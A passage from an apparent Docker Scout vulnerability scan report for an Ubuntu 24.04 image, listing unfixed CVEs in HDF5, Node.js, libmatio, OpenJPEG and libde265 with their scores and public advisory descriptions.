A vulnerability classified as problematic has been found in HDF5 up to 1.14.6. This affects the function H5FS__sinfo_Srialize_Sct_cb of the file src/H5FScache.c. The manipulation of the argument sect leads to heap-based buffer overflow. Local access is required to approach this attack. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-32609?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2024--32609" src="https://img.shields.io/badge/CVE--2024--32609-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.132%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

HDF5 Library through 1.14.3 allows stack consumption in the function H5E_printf_stack in H5Eint.c.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-13867?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 9.8: CVE--2018--13867" src="https://img.shields.io/badge/CVE--2018--13867-lightgrey?label=low%209.8&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>9.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.546%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>68th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in the HDF HDF5 1.8.20 library. There is an out of bounds read in the function H5F__accum_read in H5Faccum.c.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-46242?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 8.8: CVE--2021--46242" src="https://img.shields.io/badge/CVE--2021--46242-lightgrey?label=low%208.8&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.291%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>52nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

HDF5 v1.13.1-1 was discovered to contain a heap-use-after free via the component H5AC_unpin_entry.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2020-18494?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 8.8: CVE--2020--18494" src="https://img.shields.io/badge/CVE--2020--18494-lightgrey?label=low%208.8&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.889%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>75th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Buffer Overflow vulnerability in function H5S_close in H5S.c in HDF5 1.10.4 allows remote attackers to run arbitrary code via creation of crafted file.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-16438?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 8.8: CVE--2018--16438" src="https://img.shields.io/badge/CVE--2018--16438-lightgrey?label=low%208.8&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.579%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>69th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in the HDF HDF5 1.8.20 library. There is an out of bounds read in H5L_extern_query at H5Lexternal.c.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-14031?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 8.8: CVE--2018--14031" src="https://img.shields.io/badge/CVE--2018--14031-lightgrey?label=low%208.8&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>8.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.546%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>68th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in the HDF HDF5 1.8.20 library. There is a heap-based buffer over-read in the function H5T_copy in H5T.c.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-6857?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 7.8: CVE--2025--6857" src="https://img.shields.io/badge/CVE--2025--6857-lightgrey?label=low%207.8&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.034%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability has been found in HDF5 1.14.6 and classified as problematic. Affected by this vulnerability is the function H5G__node_cmp3 of the file src/H5Gnode.c. The manipulation leads to stack-based buffer overflow. It is possible to launch the attack on the local host. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-6856?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 7.8: CVE--2025--6856" src="https://img.shields.io/badge/CVE--2025--6856-lightgrey?label=low%207.8&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.034%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability, which was classified as problematic, was found in HDF5 1.14.6. Affected is the function H5FL__reg_gc_list of the file src/H5FL.c. The manipulation leads to use after free. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-6818?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 7.8: CVE--2025--6818" src="https://img.shields.io/badge/CVE--2025--6818-lightgrey?label=low%207.8&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>7.8</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.035%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability, which was classified as problematic, was found in HDF5 1.14.6. Affected is the function H5O__chunk_protect of the file /src/H5Ochunk.c. The manipulation leads to heap-based buffer overflow. An attack has to be approached locally. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-46244?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 6.5: CVE--2021--46244" src="https://img.shields.io/badge/CVE--2021--46244-lightgrey?label=low%206.5&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.380%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>59th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A Divide By Zero vulnerability exists in HDF5 v1.13.1-1 vis the function H5T__complete_copy () at /hdf5/src/H5T.c. This vulnerability causes an aritmetic exception, leading to a Denial of Service (DoS).

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2021-46243?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 6.5: CVE--2021--46243" src="https://img.shields.io/badge/CVE--2021--46243-lightgrey?label=low%206.5&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.277%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>51st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An untrusted pointer dereference vulnerability exists in HDF5 v1.13.1-1 via the function H5O__dtype_decode_helper () at hdf5/src/H5Odtype.c. This vulnerability can lead to a Denial of Service (DoS).

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2018-17439?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 6.5: CVE--2018--17439" src="https://img.shields.io/badge/CVE--2018--17439-lightgrey?label=low%206.5&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.686%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>71st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in the HDF HDF5 1.10.3 library. There is a stack-based buffer overflow in the function H5S_extent_get_dims() in H5S.c. Specifically, this issue occurs while converting an HDF5 file to a GIF file.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-6858?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 5.5: CVE--2025--6858" src="https://img.shields.io/badge/CVE--2025--6858-lightgrey?label=low%205.5&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>5.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.035%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in HDF5 1.14.6 and classified as problematic. Affected by this issue is the function H5C__flush_single_entry of the file src/H5Centry.c. The manipulation leads to null pointer dereference. The attack needs to be approached locally. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-6817?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low : CVE--2025--6817" src="https://img.shields.io/badge/CVE--2025--6817-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.039%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability, which was classified as problematic, has been found in HDF5 1.14.6. This issue affects the function H5C__load_entry of the file /src/H5Centry.c. The manipulation leads to resource consumption. The attack needs to be approached locally. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-6816?s=ubuntu&n=hdf5&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low : CVE--2025--6816" src="https://img.shields.io/badge/CVE--2025--6816-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.039%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability classified as problematic was found in HDF5 1.14.6. This vulnerability affects the function H5O__fsinfo_encode of the file /src/H5Ofsinfo.c. The manipulation leads to heap-based buffer overflow. It is possible to launch the attack on the local host. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 6" src="https://img.shields.io/badge/M-6-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>nodejs</strong> <code>24.14.0-1nodesource1</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/nodejs@24.14.0-1nodesource1?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-23166?s=ubuntu&n=nodejs&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2025--23166" src="https://img.shields.io/badge/CVE--2025--23166-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.040%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The C++ method SignTraits::DeriveBits() may incorrectly call ThrowException() based on user-supplied inputs when executing in a background thread, crashing the Node.js process. Such cryptographic operations are commonly applied to untrusted inputs. Thus, this mechanism potentially allows an adversary to remotely crash a Node.js runtime.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-23085?s=ubuntu&n=nodejs&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2025--23085" src="https://img.shields.io/badge/CVE--2025--23085-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.131%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>33rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A memory leak could occur when a remote peer abruptly closes the socket without sending a GOAWAY notification. Additionally, if an invalid header was detected by nghttp2, causing the connection to be terminated by the peer, the same leak was triggered. This flaw could lead to increased memory consumption and potential denial of service under certain conditions.  This vulnerability affects HTTP/2 Server users on Node.js v18.x, v20.x, v22.x and v23.x.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-27983?s=ubuntu&n=nodejs&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2024--27983" src="https://img.shields.io/badge/CVE--2024--27983-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>75.161%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>99th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An attacker can make the Node.js HTTP/2 server completely unavailable by sending a small amount of HTTP/2 frames packets with a few HTTP/2 frames inside. It is possible to leave some data in nghttp2 memory after reset when headers with HTTP/2 CONTINUATION frame are sent to the server and then a TCP connection is abruptly closed by the client triggering the Http2Session destructor while header frames are still being processed (and stored in memory) causing a race condition.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-27982?s=ubuntu&n=nodejs&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2024--27982" src="https://img.shields.io/badge/CVE--2024--27982-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.299%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>53rd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

The team has identified a critical vulnerability in the http server of the most recent version of Node, where malformed headers can lead to HTTP request smuggling. Specifically, if a space is placed before a content-length header, it is not interpreted correctly, enabling attackers to smuggle in a second request within the body of the first.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-22020?s=ubuntu&n=nodejs&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2024--22020" src="https://img.shields.io/badge/CVE--2024--22020-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.118%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>31st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A security flaw in Node.js  allows a bypass of network import restrictions. By embedding non-network imports in data URLs, an attacker can execute arbitrary code, compromising system security. Verified on various platforms, the vulnerability is mitigated by forbidding data URLs in network imports. Exploiting this flaw can violate network import security, posing a risk to developers and servers.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2024-22018?s=ubuntu&n=nodejs&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2024--22018" src="https://img.shields.io/badge/CVE--2024--22018-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.105%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>29th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability has been identified in Node.js, affecting users of the experimental permission model when the --allow-fs-read flag is used. This flaw arises from an inadequate permission model that fails to restrict file stats through the fs.lstat API. As a result, malicious actors can retrieve stats from files that they do not have explicit read access to. This vulnerability affects all users using the experimental permission model in Node.js 20 and Node.js 21. Please note that at the time this CVE was issued, the permission model is an experimental feature of Node.js.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 3" src="https://img.shields.io/badge/M-3-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>libmatio</strong> <code>1.5.26-1build3</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/libmatio@1.5.26-1build3?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2025-2338?s=ubuntu&n=libmatio&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 8.1: CVE--2025--2338" src="https://img.shields.io/badge/CVE--2025--2338-lightgrey?label=medium%208.1&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>8.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.202%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>42nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability, which was classified as critical, was found in tbeu matio 1.5.28. Affected is the function strdup_vprintf of the file src/io.c. The manipulation leads to heap-based buffer overflow. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-2337?s=ubuntu&n=libmatio&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium 8.1: CVE--2025--2337" src="https://img.shields.io/badge/CVE--2025--2337-lightgrey?label=medium%208.1&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>8.1</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.535%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>67th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability, which was classified as critical, has been found in tbeu matio 1.5.28. This issue affects the function Mat_VarPrint of the file src/mat.c. The manipulation leads to heap-based buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-50343?s=ubuntu&n=libmatio&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2025--50343" src="https://img.shields.io/badge/CVE--2025--50343-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.072%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in matio 1.5.28. A heap-based memory corruption can occur in Mat_VarCreateStruct() when the nfields value does not match the actual number of strings in the fields array. This leads to out-of-bounds reads and invalid memory frees during cleanup, potentially causing a segmentation fault or heap corruption.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-20019?s=ubuntu&n=libmatio&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 6.5: CVE--2019--20019" src="https://img.shields.io/badge/CVE--2019--20019-lightgrey?label=low%206.5&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.403%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>61st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An attempted excessive memory allocation was discovered in Mat_VarRead5 in mat5.c in matio 1.5.17.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 1" src="https://img.shields.io/badge/L-1-fce1a9"/> <!-- unspecified: 0 --><strong>openjpeg2</strong> <code>2.5.0-2ubuntu0.4</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/openjpeg2@2.5.0-2ubuntu0.4?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2023-39329?s=ubuntu&n=openjpeg2&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2023--39329" src="https://img.shields.io/badge/CVE--2023--39329-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.108%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>29th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A flaw was found in OpenJPEG. A resource exhaustion can occur in the opj_t1_decode_cblks function in tcd.c through a crafted image file, causing a denial of service.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2023-39328?s=ubuntu&n=openjpeg2&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2023--39328" src="https://img.shields.io/badge/CVE--2023--39328-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.013%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>2nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in OpenJPEG similar to CVE-2019-6988. This flaw allows an attacker to bypass existing protections and cause an application crash through a maliciously crafted file.

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2019-6988?s=ubuntu&n=openjpeg2&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="low 6.5: CVE--2019--6988" src="https://img.shields.io/badge/CVE--2019--6988-lightgrey?label=low%206.5&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>CVSS Score</td><td><code>6.5</code></td></tr>
<tr><td>CVSS Vector</td><td><code>CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H</code></td></tr>
<tr><td>EPSS Score</td><td><code>0.327%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>55th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in OpenJPEG 2.3.0. It allows remote attackers to cause a denial of service (attempted excessive memory allocation) in opj_calloc in openjp2/opj_malloc.c, when called from opj_tcd_init_tile in openjp2/tcd.c, as demonstrated by the 64-bit opj_decompress.

</blockquote>
</details>
</details></td></tr>

<tr><td valign="top">
<details><summary><img alt="critical: 0" src="https://img.shields.io/badge/C-0-lightgrey"/> <img alt="high: 0" src="https://img.shields.io/badge/H-0-lightgrey"/> <img alt="medium: 2" src="https://img.shields.io/badge/M-2-fbb552"/> <img alt="low: 0" src="https://img.shields.io/badge/L-0-lightgrey"/> <!-- unspecified: 0 --><strong>libde265</strong> <code>1.0.15-1build3</code> (deb)</summary>

<small><code>pkg:deb/ubuntu/libde265@1.0.15-1build3?os_distro=noble&os_name=ubuntu&os_version=24.04</code></small><br/>
<a href="https://scout.docker.com/v/CVE-2024-38950?s=ubuntu&n=libde265&ns=ubuntu&t=deb&osn=ubuntu&osv=24.04&vr=%3E%3D0"><img alt="medium : CVE--2024--38950" src="https://img.shields.io/badge/CVE--2024--38950-lightgrey?label=medium%20&labelColor=fbb552"/></a> 

<table>
<tr><td>Affected range</td><td><code>>=0</code></td></tr>
